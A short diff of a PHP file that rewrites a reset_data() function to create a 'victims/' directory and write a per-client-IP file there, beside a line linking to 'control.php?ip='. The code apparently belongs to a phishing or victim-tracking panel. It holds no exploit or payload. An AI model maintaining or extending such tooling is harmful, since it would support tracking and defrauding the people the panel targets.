@@ -194,10 +194,14 @@ ini_set('display_errors', 1);
         return $ee = $x['dirname'] . '/control.php?ip=' . get_client_ip();
     }
     
+   
     function reset_data() {
-        $fp = fopen('victims/'. get_client_ip() .'.txt', 'wb');
-        fwrite($fp, 0);
-        fclose($fp);
+    $dir = 'victims/';
+        if (!is_dir($dir)) {
+            mkdir($dir, 0755, true);
+        }
+        $filepath = $dir . get_client_ip() . '.txt';
+        // Use file_put_contents for simplicity
+        file_put_contents($filepath, '0');
     }
-
 ?>
